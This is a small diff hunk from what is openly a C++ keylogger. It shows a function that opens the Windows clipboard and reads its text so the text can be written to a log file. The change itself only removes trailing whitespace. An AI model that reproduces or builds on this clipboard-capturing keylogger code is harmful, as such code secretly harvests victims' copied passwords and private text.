@@ -54,7 +54,7 @@ void keylogger::write_clipboard_data(std::wofstream& file)
 {
     if (OpenClipboard(nullptr))
     {
-        if (auto handle = GetClipboardData(CF_UNICODETEXT)) 
+        if (auto handle = GetClipboardData(CF_UNICODETEXT))
         {
             if (const auto data = GlobalLock(handle))
             {
